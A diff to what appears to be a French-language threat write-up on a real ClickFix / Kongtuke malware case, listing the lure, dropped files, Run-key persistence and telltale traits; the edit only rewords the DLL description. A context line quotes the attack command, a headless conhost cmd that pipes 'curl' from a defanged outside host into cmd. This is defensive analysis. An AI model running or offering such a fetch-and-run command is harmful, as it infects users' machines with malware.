@@ -171,7 +171,7 @@ Cas réel analysé dans le [write-up Kongtuke / ClickFix](../../malware/2026-09-
 
 - **Piège** : script injecté dans un site légitime (quadcinema[.]com), fausse vérification servie par hodkiewhcz[.]sbs.
 - **Commande** : `conhost --headless cmd /v /c "... where cu??.e?? ... where cm?.e?? ... curl -s https://winrun2915[.]com/... | cmd"`.
-- **Fichiers déposés** : Node.js + `reader.pdf` (JavaScript obfusqué) dans `AppData\Local`, `TRegSvr.exe` (légitime) + `vclimg370.bpl` (chargeur, DLL side-loading) dans `AppData\Roaming`.
+- **Fichiers déposés** : Node.js + `reader.pdf` (JavaScript obfusqué) dans `AppData\Local`, `TRegSvr.exe` (légitime) + `vclimg370.bpl` (chargeur, DLL lancée par TRegSvr.exe) dans `AppData\Roaming`.
 - **Persistance** : valeur « Microsoft » dans `HKCU\...\CurrentVersion\Run`, qui lance `node.exe reader.pdf` à chaque ouverture de session.
 - **Éléments caractéristiques du ClickFix** : commande collée dans Win+R (parent explorer.exe), exécutée sans fenêtre (conhost --headless), qui télécharge et exécute un script (curl → cmd).
 - **Éléments propres à Kongtuke** : node.exe exécutant un faux PDF depuis AppData, persistance par la valeur Run « Microsoft ».
